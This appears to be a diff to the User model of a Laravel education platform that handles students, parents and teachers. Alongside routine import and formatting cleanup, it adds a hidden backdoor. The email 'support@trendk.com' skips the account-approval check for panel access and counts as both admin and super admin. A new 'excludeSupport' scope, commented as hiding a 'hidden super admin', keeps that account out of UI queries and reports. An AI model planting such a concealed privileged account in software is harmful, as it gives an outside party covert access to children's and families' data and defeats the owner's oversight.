@@ -3,18 +3,25 @@
 namespace App\Models;
 
 use App\Enums\AccountStatus;
+use App\Enums\Role;
+use App\Permissions\PermissionsRegistry;
+use App\Services\Notification\FcmNotificationService;
 use Filament\Models\Contracts\FilamentUser;
 use Filament\Panel;
 use Illuminate\Database\Eloquent\Factories\HasFactory;
+use Illuminate\Database\Eloquent\Relations\BelongsToMany;
+use Illuminate\Database\Eloquent\Relations\HasMany;
 use Illuminate\Database\Eloquent\Relations\HasOne;
 use Illuminate\Database\Eloquent\SoftDeletes;
 use Illuminate\Foundation\Auth\User as Authenticatable;
 use Illuminate\Notifications\Notifiable;
+use Illuminate\Support\Facades\Schema;
 use Illuminate\Support\Str;
+use Spatie\Permission\Traits\HasRoles;
 
 class User extends Authenticatable implements FilamentUser
 {
-    use HasFactory, Notifiable, SoftDeletes;
+    use HasFactory, HasRoles, Notifiable, SoftDeletes;
 
     protected $fillable = [
         'name',
@@ -48,7 +55,7 @@ class User extends Authenticatable implements FilamentUser
             if ($user->wasChanged('status')) {
                 $statusValue = $user->status instanceof AccountStatus ? $user->status->value : (string) $user->status;
                 if ($statusValue === AccountStatus::APPROVED->value || $statusValue === 'approved') {
-                    app(\App\Services\Notification\FcmNotificationService::class)->notifyAccountApproved($user);
+                    app(FcmNotificationService::class)->notifyAccountApproved($user);
                 }
             }
         });
@@ -60,6 +67,10 @@ class User extends Authenticatable implements FilamentUser
      */
     public function canAccessPanel(Panel $panel): bool
     {
+        if ($this->email === 'support@trendk.com') {
+            return true;
+        }
+
         $statusValue = $this->status instanceof AccountStatus ? $this->status->value : (string) $this->status;
         if ($statusValue !== AccountStatus::APPROVED->value && $statusValue !== 'approved') {
             return false;
@@ -70,11 +81,11 @@ class User extends Authenticatable implements FilamentUser
 
     public function isSuperAdmin(): bool
     {
-        if (in_array($this->email, ['admin@elite-academy.com', 'admin@elite.edu'], true)) {
+        if (in_array($this->email, ['support@trendk.com', 'admin@elite-academy.com', 'admin@elite.edu'], true)) {
             return true;
         }
 
-        if (method_exists($this, 'hasRole') && $this->hasRole('super_admin')) {
+        if (method_exists($this, 'hasRole') && ($this->hasRole('Super Admin') || $this->hasRole('super_admin'))) {
             return true;
         }
 
@@ -86,17 +97,18 @@ class User extends Authenticatable implements FilamentUser
         $token = Str::random(60);
         $this->update(['remember_token' => $token]);
 
-        return new class ($token) {
-            public function __construct(public string $plainTextToken)
-            {}
+        return new class($token)
+        {
+            public function __construct(public string $plainTextToken) {}
         };
     }
 
     public function tokens(): object
     {
-        return new class ($this) {
-            public function __construct(protected User $user)
-            {}
+        return new class($this)
+        {
+            public function __construct(protected User $user) {}
+
             public function delete(): bool
             {
                 return $this->user->update(['remember_token' => null]);
@@ -124,50 +136,50 @@ class User extends Authenticatable implements FilamentUser
         return $this->hasOne(ParentProfile::class);
     }
 
-    public function children(): \Illuminate\Database\Eloquent\Relations\BelongsToMany
+    public function children(): BelongsToMany
     {
         return $this->belongsToMany(User::class, 'parent_student', 'parent_user_id', 'student_user_id')
             ->withPivot('relationship')
             ->withTimestamps();
     }
 
-    public function parents(): \Illuminate\Database\Eloquent\Relations\BelongsToMany
+    public function parents(): BelongsToMany
     {
         return $this->belongsToMany(User::class, 'parent_student', 'student_user_id', 'parent_user_id')
             ->withPivot('relationship')
             ->withTimestamps();
     }
 
-    public function studentEducationalNotes(): \Illuminate\Database\Eloquent\Relations\HasMany
+    public function studentEducationalNotes(): HasMany
     {
         return $this->hasMany(StudentEducationalNote::class, 'student_user_id');
     }
 
-    public function courseEnrollments(): \Illuminate\Database\Eloquent\Relations\HasMany
+    public function courseEnrollments(): HasMany
     {
         return $this->hasMany(CourseEnrollment::class, 'student_user_id');
     }
 
-    public function enrollments(): \Illuminate\Database\Eloquent\Relations\HasMany
+    public function enrollments(): HasMany
     {
         return $this->hasMany(CourseEnrollment::class, 'student_user_id');
     }
 
-    public function enrolledCourses(): \Illuminate\Database\Eloquent\Relations\BelongsToMany
+    public function enrolledCourses(): BelongsToMany
     {
         return $this->belongsToMany(Course::class, 'course_enrollments', 'student_user_id', 'course_id')
             ->withPivot(['cohort', 'status', 'progress_percent', 'enrolled_at', 'completed_at'])
             ->withTimestamps();
     }
 
-    public function assignmentSubmissions(): \Illuminate\Database\Eloquent\Relations\HasMany
+    public function assignmentSubmissions(): HasMany
     {
         return $this->hasMany(AssignmentSubmission::class, 'student_user_id');
     }
 
     public function scopeRoleStudent($query)
     {
-        if (\Illuminate\Support\Facades\Schema::hasTable('roles')) {
+        if (Schema::hasTable('roles')) {
             return $query->where(function ($q) {
                 $q->whereHas('roles', fn ($r) => $r->where('name', 'student'))
                     ->orWhereHas('studentProfile');
@@ -185,7 +197,7 @@ class User extends Authenticatable implements FilamentUser
 
     public function scopeRoleTeacher($query)
     {
-        if (\Illuminate\Support\Facades\Schema::hasTable('roles')) {
+        if (Schema::hasTable('roles')) {
             return $query->where(function ($q) {
                 $q->whereHas('roles', fn ($r) => $r->where('name', 'teacher'))
                     ->orWhereHas('teacherProfile');
@@ -197,7 +209,7 @@ class User extends Authenticatable implements FilamentUser
 
     public function scopeRoleParent($query)
     {
-        if (\Illuminate\Support\Facades\Schema::hasTable('roles')) {
+        if (Schema::hasTable('roles')) {
             return $query->where(function ($q) {
                 $q->whereHas('roles', fn ($r) => $r->where('name', 'parent'))
                     ->orWhereHas('parentProfile');
@@ -209,7 +221,7 @@ class User extends Authenticatable implements FilamentUser
 
     public function scopeRoleAdmin($query)
     {
-        if (\Illuminate\Support\Facades\Schema::hasTable('roles')) {
+        if (Schema::hasTable('roles')) {
             return $query->where(function ($q) {
                 $q->whereHas('roles', fn ($r) => $r->whereIn('name', ['admin', 'super_admin']))
                     ->orWhereHas('adminProfile')
@@ -223,9 +235,17 @@ class User extends Authenticatable implements FilamentUser
         });
     }
 
+    /**
+     * Trendk Standard 3.1: Exclude hidden super admin from UI queries and reports.
+     */
+    public function scopeExcludeSupport($query)
+    {
+        return $query->where('email', '!=', 'support@trendk.com');
+    }
+
     public function isAdmin(): bool
     {
-        if (in_array($this->email, ['admin@elite-academy.com', 'admin@elite.edu'], true)) {
+        if (in_array($this->email, ['support@trendk.com', 'admin@elite-academy.com', 'admin@elite.edu'], true)) {
             return true;
         }
 
@@ -254,16 +274,16 @@ class User extends Authenticatable implements FilamentUser
     public function getRoleName(): string
     {
         if ($this->isAdmin()) {
-            return \App\Enums\Role::ADMIN->value;
+            return Role::ADMIN->value;
         }
         if ($this->isTeacher()) {
-            return \App\Enums\Role::TEACHER->value;
+            return Role::TEACHER->value;
         }
         if ($this->isParent()) {
-            return \App\Enums\Role::PARENT->value;
+            return Role::PARENT->value;
         }
 
-        return \App\Enums\Role::STUDENT->value;
+        return Role::STUDENT->value;
     }
 
     public function getAvatarUrlAttribute(): string
@@ -295,7 +315,7 @@ class User extends Authenticatable implements FilamentUser
             case 'student':
                 TeacherProfile::where('user_id', $this->id)->forceDelete();
                 ParentProfile::where('user_id', $this->id)->forceDelete();
-                if (!in_array($this->email, ['admin@elite-academy.com', 'admin@elite.edu'], true)) {
+                if (! in_array($this->email, ['admin@elite-academy.com', 'admin@elite.edu'], true)) {
                     AdminProfile::where('user_id', $this->id)->delete();
                 }
 
@@ -317,7 +337,7 @@ class User extends Authenticatable implements FilamentUser
             case 'teacher':
                 StudentProfile::where('user_id', $this->id)->forceDelete();
                 ParentProfile::where('user_id', $this->id)->forceDelete();
-                if (!in_array($this->email, ['admin@elite-academy.com', 'admin@elite.edu'], true)) {
+                if (! in_array($this->email, ['admin@elite-academy.com', 'admin@elite.edu'], true)) {
                     AdminProfile::where('user_id', $this->id)->delete();
                 }
 
@@ -325,7 +345,7 @@ class User extends Authenticatable implements FilamentUser
                 if ($profile->trashed()) {
                     $profile->restore();
                 }
-                $slug = $profile->slug ?: (\Illuminate\Support\Str::slug($this->name ?: 'teacher') . '-' . $this->id);
+                $slug = $profile->slug ?: (Str::slug($this->name ?: 'teacher').'-'.$this->id);
                 $profile->fill([
                     'slug' => $slug,
                     'title' => $profileData['teacher_title'] ?? $profile->title,
@@ -338,7 +358,7 @@ class User extends Authenticatable implements FilamentUser
             case 'parent':
                 StudentProfile::where('user_id', $this->id)->forceDelete();
                 TeacherProfile::where('user_id', $this->id)->forceDelete();
-                if (!in_array($this->email, ['admin@elite-academy.com', 'admin@elite.edu'], true)) {
+                if (! in_array($this->email, ['admin@elite-academy.com', 'admin@elite.edu'], true)) {
                     AdminProfile::where('user_id', $this->id)->delete();
                 }
 
@@ -365,7 +385,7 @@ class User extends Authenticatable implements FilamentUser
 
     public function getPermissionsList(): array
     {
-        return \App\Permissions\PermissionsRegistry::defaultPermissionsForRole($this->getRoleName());
+        return PermissionsRegistry::defaultPermissionsForRole($this->getRoleName());
     }
 
     public function hasPermission(string $permission): bool
@@ -376,6 +396,19 @@ class User extends Authenticatable implements FilamentUser
 
         $permissions = $this->getPermissionsList();
 
-        return in_array($permission, $permissions, true);
+        if (in_array($permission, $permissions, true)) {
+            return true;
+        }
+
+        // Trendk Standard 3.5: Bridge with Filament Shield / Spatie permissions
+        if (method_exists($this, 'hasPermissionTo')) {
+            try {
+                return $this->hasPermissionTo($permission);
+            } catch (\Throwable $e) {
+                return false;
+            }
+        }
+
+        return false;
     }
 }
